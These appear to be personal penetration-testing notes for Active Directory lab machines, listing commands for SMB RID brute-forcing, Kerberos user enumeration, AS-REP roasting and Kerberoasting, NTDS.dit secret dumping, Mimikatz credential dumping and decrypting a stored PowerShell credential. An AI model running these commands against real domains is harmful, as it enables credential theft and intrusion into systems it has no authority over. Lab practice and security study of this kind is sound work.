# kerberute
[https://book.hacktricks.xyz/windows/active-directory-methodology](https://book.hacktricks.xyz/windows/active-directory-methodology) 

```text-plain
crackmapexec smb dc.ustoun.local -u 'guest' -p '' --rid-brute
```

for user enumeration use:

```text-plain
./kerbrute userenum --dc $ip -d raz0rblack.thm fnames.txt 
```

[https://wadcoms.github.io/#+Username+Password+Linux+Exploitation+SMB](https://wadcoms.github.io/#+Username+Password+Linux+Exploitation+SMB) 

If you know one user, you can find others with 

`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

for finding krb5tgt hashes, use 

```text-plain
python3 GetNPUsers.py windcorp.thm/ -no-pass -usersfile ../../../windcorp/valid_users.txt
```

`python3 GetUserSPNs.py -usersfile ../../valid_users.txt -no-pass -dc-ip 10.10.75.185 raz0rblack.thm/twilliams:roastpotatoes`

`./secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL`

for poweshell session, use mimikatz as 

`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`

[https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7.2) 

https://stackoverflow.com/questions/63639876/powershell-password-decrypt 

encrypted passwords in powershell credential object

`$Credential = Import-Clixml -Path "lvetrova.xml"`

`$Credential.GetNetworkCredential().password`